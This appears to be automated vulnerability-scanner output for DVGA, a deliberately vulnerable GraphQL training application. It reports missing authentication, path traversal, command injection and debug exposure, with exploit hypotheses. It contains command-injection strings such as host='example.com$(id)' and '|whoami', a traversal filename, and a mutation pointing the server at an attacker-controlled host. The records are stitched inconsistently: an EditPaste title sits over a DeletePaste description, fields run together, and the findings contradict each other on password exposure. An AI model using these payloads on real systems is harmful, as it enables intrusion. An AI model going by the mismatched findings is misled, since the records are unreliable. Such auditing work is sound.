proof.exploit_hypothesis: An unauthenticated attacker can create arbitrary pastes in the system by sending a GraphQL mutation request to the CreatePaste endpoint without any authentication credentials. The mutation accepts user-controlled title, content, public, and burn parameters and persists them to the database with the owner hardcoded to 'DVGAUser'. Since no authentication check is performed (no @auth_required decorator, JWT verification disabled with verify_signature=False), and the application does not validate the requester's identity, any attacker can inject malicious content, create public or private pastes, and potentially use this for data exfiltration, content injection attacks, or to poison the paste database with malicious payloads. The vulnerability is a direct result of missing authentication controls on a critical data creation endpoint.

data.title: Missing Authorization in EditPaste Mutation
data.description: The DeletePaste GraphQL mutation at core/views.py:164-173 allows any unauthenticated or authenticated user to delete any paste by ID without authorization checks. The mutation accepts an 'id' parameter and directly executes a database delete operation without verifying if the requesting user owns the paste or has permission to delete it. This vulnerability is compounded by the application's broken JWT authentication (signature verification disabled with verify_signature=False, verify_exp=False), allowing attackers to forge authentication tokens. The combination of broken authentication and missing authorization enables any attacker to delete arbitrary pastes in the system, leading to complete loss of data integrity and availability for paste resources.
data.rationale: Complete data flow verified from attacker-controlled id parameter (line 136) through mutate handler (line 140) to database UPDATE (line 148) and commit (line 151). No authorization check exists to verify paste ownership. Tracer mapped full execution path, sanitization output confirms no controls present, and exploit payload demonstrates arbitrary paste modification without authentication verification. The EditPaste mutation allows any user to modify any paste by ID.

proof.exploit_hypothesis: An attacker can exploit the Missing Authorization vulnerability in the EditPaste GraphQL mutation by sending a crafted mutation request with any paste ID. The mutation at core/views.py:132-155 accepts an 'id' parameter and directly updates the paste's title and content without verifying if the requesting user owns the paste or has permission to modify it. This allows any unauthenticated or authenticated user to modify arbitrary pastes in the system by simply knowing their ID values. The vulnerability is exacerbated by the application's broken JWT authentication (with verify_signature=False and verify_exp=False), enabling attackers to forge authentication tokens and perform authorized operations. The attacker can enumerate paste IDs or use known IDs to modify sensitive content, deface pastes, or inject malicious content into arbitrary user's pastes.

data.title: Missing Authentication on CreateUser Mutation
data.description: The CreateUser GraphQL mutation at core/views.py:92-107 allows unauthenticated users to create new user accounts without any authentication or authorization check. The mutation accepts username, email, and password via the UserInput type and directly calls User.create_user() without verifying if the requestor has permission to create users. This enables any anonymous attacker to create arbitrary user accounts, potentially leading to unauthorized access, privilege escalation, or resource exhaustion attacks. The application uses JWT-based authentication (flask_graphql_auth library) with a hardcoded weak secret key 'dvga' and disabled signature verification, further compounding the authentication weaknesses.
data.rationale: Tracer confirms complete attack path from GraphQL mutation arguments (username, email, password) to User.create_user() sink. Sanitization analysis confirms zero authentication controls exist - no JWT validation, session checks, or permission verification. Exploit provides concrete POST payload demonstrating unauthorized account creation. Code at core/views.py:92-107 directly creates users without any authorization checks.

proof.exploit_hypothesis: An unauthenticated attacker can send a GraphQL mutation request to the /graphql endpoint to create arbitrary user accounts without any authentication or authorization. The CreateUser mutation at core/views.py:92-107 accepts username, email, and password via the UserInput type and directly invokes User.create_user() which persists the user to the database. data.title: Missing Authentication on File Upload Mutation
data.description: The UploadPaste GraphQL mutation (core/views.py:175-198) allows unauthenticated users to upload files and create paste entries in the database. The mutation lacks any authentication checks, unlike protected queries such as resolve_me which verify JWT tokens via get_identity(). The mutation accepts user-controlled filename and content parameters without validating whether the requester is authenticated. This allows anonymous users to create pastes tied to the 'DVGAUser' owner account. Combined with the application's JWT authentication bypass (verify_signature=False, verify_exp=False in helpers.py:21), this vulnerability enables unauthenticated file uploads that could be exploited for data exfiltration, content injection, or to poison the paste database with malicious content.
data.rationale: Tracer confirms complete data flow from GraphQL mutation arguments (filename, content) to filesystem write via helpers.save_file() without authentication checks. Sanitization analysis confirms no input validation on filename parameter, enabling path traversal attacks (e.g., '../../../app.py'). Exploit payload demonstrates unauthenticated arbitrary file write capability with high impact potential.

proof.exploit_hypothesis: An unauthenticated attacker can exploit the UploadPaste GraphQL mutation to write files to arbitrary locations on the filesystem using path traversal. The mutation at core/views.py:185 calls helpers.save_file() without any authentication verification, and the save_file() function at core/helpers.py:25 directly concatenates the user-controlled filename to WEB_UPLOADDIR without sanitization. An attacker can send a GraphQL mutation with a filename containing path traversal sequences (e.g., '../../../app.py') to write content outside the intended 'pastes/' directory, potentially overwriting application files or injecting malicious code that will be executed by the application.

data.title: Missing Authentication on ImportPaste GraphQL Mutation
data.description: The ImportPaste GraphQL mutation at core/views.py:200-223 lacks authentication controls, allowing unauthenticated attackers to trigger server-side requests to arbitrary URLs. The mutation accepts user-controlled parameters (host, port, path, scheme) that are concatenated into a URL and executed via 'curl --insecure' through helpers.run_cmd(). This represents both a Missing Authentication vulnerability (CWE-306) and enables Server-Side Request Forgery (SSRF) attacks. The application uses JWT-based authentication (flask_graphql_auth library) with a hardcoded weak secret key 'dvga', but the ImportPaste mutation does not implement any JWT validation or identity verification. An unauthenticated attacker can exploit this to: (1) probe internal network services, (2) access cloud metadata endpoints (e.g., 169.254.169.254), (3) interact with internal APIs, or (4) exfiltrate data to attacker-controlled servers. The vulnerability is compounded by the use of curl --insecure flag which disables SSL/TLS certificate validation.
data.rationale: Complete data flow confirmed from user-controlled GraphQL mutation arguments (host, path) to os.popen() command execution. Tracer verified sink reached. Sanitization (strip_dangerous_characters) is insufficient - marked as bypassable via backticks, dollar-parentheses, and pipes. Concrete exploit payload provided that injects command substitution $(id) into curl command, enabling arbitrary command execution. Unauthenticated attack vector confirmed.

proof.exploit_hypothesis: An unauthenticated attacker can exploit the ImportPaste GraphQL mutation to execute arbitrary system commands on the server. The vulnerability exists at core/views.py:209-211 where user-controlled URL components (host, path) are constructed into a curl command and executed via os.popen() at core/helpers.py:9. The strip_dangerous_characters() sanitization at core/security.py:41-46 is insufficient - in easy mode it returns input unchanged, and in hard mode only removes ';' and '&' characters while leaving other dangerous shell metacharacters like backticks (`), dollar-parentheses ($()), and pipes (|). An attacker can inject command substitution payloads via the host or path parameters to execute arbitrary commands on the server.

sanitization_analysis.bypass_method: In easy mode, strip_dangerous_characters() returns input unchanged. In hard mode, it only removes ';' and '&' characters but leaves other dangerous shell metacharacters including backticks (`), dollar-parentheses ($()), pipes (|), logical OR (||), redirection operators (<, >), and subshell operators. Attackers can bypass by using: backtick command substitution (host='example.com`id`'), dollar-parentheses (host='example.com$(id)'), or pipe chains (host='example.com|whoami'). The constructed URL is directly interpolated into a curl command executed via os.popen(), enabling arbitrary command injection.

This demonstrates arbitrary command execution with the privileges of the web server process.

data.title: Missing Authentication on User Enumeration Query
data.description: The resolve_users GraphQL resolver at core/views.py:370-378 lacks authentication checks, allowing unauthenticated attackers to enumerate all user accounts. The resolver queries the User model and returns all fields including usernames and plaintext passwords (as confirmed by the User model at core/models.py:9-22 which stores passwords without hashing). While the UserObject excludes the email field, it still exposes sensitive credential data. The application uses JWT-based authentication (flask_graphql_auth library imported at views.py:31), yet this resolver performs no token validation or identity verification before returning user data. This vulnerability enables complete user account enumeration and credential harvesting by any anonymous user.
data.rationale: Tracer confirms vulnerable code path from unauthenticated GraphQL request to User data exposure. Sanitization analysis found no authentication controls. Exploit hypothesis provides concrete payload and confirms username enumeration is possible. The resolve_users resolver at core/views.py:370-378 lacks any authentication decorator or token validation despite the application using JWT authentication elsewhere.

proof.exploit_hypothesis: An unauthenticated attacker can enumerate all user accounts by querying the 'users' field through the GraphQL endpoint at /graphql. The resolve_users resolver at core/views.py:370 lacks authentication checks and returns all User records. While the password field is masked with '******' for non-admin users via resolve_password logic, the username field is fully exposed, enabling complete user enumeration. Additionally, if combined with the 'me' query that sets identity context from a JWT token, an attacker with admin credentials could retrieve plaintext passwords since the User model stores passwords without hashing at core/models.py:14.

data.title: Stack Trace and Debug Information Exposure in GraphQL Error Responses
data.description: The GraphQL error handling in core/view_override.py exposes sensitive information through error messages. When a GraphQLError occurs, the format_custom_error function (lines 47-55) adds detailed debug information to the error response including full stack traces (traceback.format_stack), exception details (traceback.format_exc), and internal file paths (caller_filename_full). This information is included in the 'extensions.exception' field of error responses sent to clients. Combined with WEB_DEBUG defaulting to True in config.py, this exposes internal application structure, file system layout, and implementation details that attackers can use to plan more targeted attacks. The exposure occurs for all GraphQL errors except when the message contains 'GraphiQL Access Rejected', providing minimal protection.
data.rationale: The tracer confirms the sink is reached with complete data flow from GraphQL query to error response. The format_custom_error function (lines 47-55) unconditionally exposes stack traces, exception details, and file paths for all errors except 'GraphiQL Access Rejected'. The sanitization is trivially bypassed. A concrete exploit payload (query with non-existent field) is provided with expected outcome showing sensitive debug info exposure. WEB_DEBUG defaults to True, enabling this vulnerability by default.

proof.exploit_hypothesis: The format_custom_error function in core/view_override.py exposes full stack traces, exception details, and internal file paths in GraphQL error responses. An attacker can trigger this information disclosure by sending any malformed GraphQL query that causes a GraphQLError (syntax error, validation error, or resolver exception). The sanitization at line 43 only filters messages containing 'GraphiQL Access Rejected', so all other error types will include sensitive debug information in the extensions.exception field. Since WEB_DEBUG defaults to True in config.py, this vulnerability exposes internal application structure, file system layout, and implementation details that can be used to plan more targeted attacks.

data.title: Debug Mode Enabled by Default
data.description: The WEB_DEBUG configuration at config.py:11 defaults to True when the WEB_DEBUG environment variable is not set. This exposes the application to significant security risks including detailed stack traces in error responses, interactive debugger pages that allow arbitrary code execution, and verbose logging that may leak sensitive information. The default True value means debug mode will be active unless explicitly disabled, violating the security principle of 'secure by default'. This is particularly dangerous in production deployments where developers may forget to set the environment variable.
data.rationale: Tracer confirms complete data flow from WEB_DEBUG default (True) to stack trace exposure in error responses. No sanitization exists. Exploit is trivial: send malformed GraphQL query to receive HTTP 400 with extensions.exception containing full stack traces, file paths, and debug info. Source-to-sink path fully validated.

proof.exploit_hypothesis: When WEB_DEBUG environment variable is not set, the application defaults to debug mode (True) as configured in config.py:11. In this state, the custom error formatter at core/view_override.py:43-55 captures and exposes detailed stack traces, debug information, and full file paths in GraphQL error responses. An attacker can exploit this by sending a malformed or invalid GraphQL query to any GraphQL endpoint. The error response will include the 'extensions.exception' field containing stack traces, debug info, and file system paths, which can reveal sensitive application internals, source code structure, and potentially sensitive configuration details that aid in further attacks.

data.title: Insecure TLS Certificate Verification Disabled in Curl Command
data.description: The ImportPaste GraphQL mutation at core/views.py:211 uses curl with the --insecure flag, which completely disables TLS/SSL certificate verification. This allows an attacker to perform man-in-the-middle attacks by presenting self-signed or invalid certificates, potentially intercepting, reading, or modifying sensitive data in transit. The URL is constructed from user-controlled parameters (host, port, path, scheme) which, combined with disabled certificate validation, creates a significant security risk. CWE-319 addresses the cleartext transmission of sensitive information due to improper TLS/SSL configuration.
data.rationale: The tracer confirms the flow from user-controlled ImportPaste arguments (host, port, path, scheme) through to os.popen() executing curl with the hardcoded --insecure flag. The sanitization analysis correctly identifies that strip_dangerous_characters() only removes shell metacharacters but has no effect on the TLS verification bypass. The exploit hypothesis and payload are valid - an attacker can host a malicious HTTPS server with an invalid certificate and the application will accept it due to the hardcoded --insecure flag, enabling MITM attacks.

proof.exploit_hypothesis: An attacker can perform a man-in-the-middle attack by hosting a malicious HTTPS server with a self-signed or invalid TLS certificate and triggering the ImportPaste GraphQL mutation with their server URL. The hardcoded '--insecure' flag in core/views.py:211 disables curl's certificate verification, causing the application to accept the invalid certificate and execute the request. The attacker can intercept the HTTPS connection, return malicious content, and have it stored as a paste in the application. The strip_dangerous_characters() function only removes shell metacharacters (; and &) but does not affect the TLS verification bypass.

sanitization_analysis.bypass_method: No sanitization found for TLS verification. The --insecure flag is hardcoded at core/views.py:211 and cannot be bypassed via input sanitization. The strip_dangerous_characters() function only removes shell metacharacters (; and &) for command injection prevention, but has no effect on the hardcoded --insecure flag that disables TLS certificate validation. The vulnerability is inherent in the code design - curl always executes with certificate verification disabled regardless of user input.

proof.exploit_payload: mutation { ImportPaste(host: "attacker-controlled-server.com", port: 443, path: "/malicious-endpoint", scheme: "https") { result } }
proof.expected_outcome: The curl command executes successfully with the '--insecure' flag, accepting the attacker's invalid/self-signed TLS certificate without verification. The attacker's server receives the HTTPS request, can intercept or modify the traffic, and returns a malicious response that gets stored as a new paste in the DVGA application. The application returns the attacker's response content in the GraphQL mutation result, confirming the MITM attack succeeded.
